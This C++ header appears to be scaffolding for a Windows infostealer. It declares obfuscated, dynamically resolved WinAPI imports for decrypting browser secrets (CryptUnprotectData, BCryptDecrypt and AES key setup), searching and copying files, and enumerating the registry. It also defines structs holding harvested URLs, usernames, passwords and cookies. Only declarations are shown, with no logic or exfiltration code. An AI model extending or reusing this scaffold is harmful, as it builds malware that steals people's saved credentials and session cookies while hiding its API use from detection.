#pragma once
#include <string>
#include <vector>
#include <Windows.h>
#include <shlobj_core.h>
#include <obfuscator/WinApiImport.h>

using String = std::string;
template<class T>
using List = std::vector<T>;


#pragma region WINAPI_FUNCS 
using f_BCryptDecrypt = decltype(BCryptDecrypt);
using f_SHGetFolderPathA = decltype(SHGetFolderPathA);
using f_SHFileOperation = decltype(SHFileOperation);
using f_CreateFileA = decltype(CreateFileA);
using f_GetFileSize = decltype(GetFileSize);
using f_ReadFile = decltype(ReadFile);
using f_CloseHandle = decltype(CloseHandle);
using f_CryptUnprotectData = decltype(CryptUnprotectData);
using f_BCryptOpenAlgorithmProvider = decltype(BCryptOpenAlgorithmProvider);
using f_BCryptSetProperty = decltype(BCryptSetProperty);
using f_BCryptGenerateSymmetricKey = decltype(BCryptGenerateSymmetricKey);
using f_GetFileAttributesA = decltype(GetFileAttributesA);

using f_FindFirstFile = decltype(FindFirstFile);
using f_FindNextFile = decltype(FindNextFile);
using f_FindClose = decltype(FindClose);
using f_GetFullPathName = decltype(GetFullPathName);
using f_SHCreateDirectoryEx = decltype(SHCreateDirectoryEx);
using f_CopyFileA = decltype(CopyFileA);
using f_GetTempPathA = decltype(GetTempPathA);


//regex
using f_RegOpenKeyEx = decltype(RegOpenKeyEx);
using f_RegQueryValueEx = decltype(RegQueryValueEx);
using f_RegQueryInfoKey = decltype(RegQueryInfoKey);
using f_RegEnumKeyEx = decltype(RegEnumKeyEx);
using f_RegCloseKey = decltype(RegCloseKey);
#pragma endregion



struct AccountData
{
	String Url;
	String Username;
	String Password;
};


struct CookieData
{
	String HostKey;
	String Name;
	String Value;
	String Path;
	String ExpireUTC;	
};
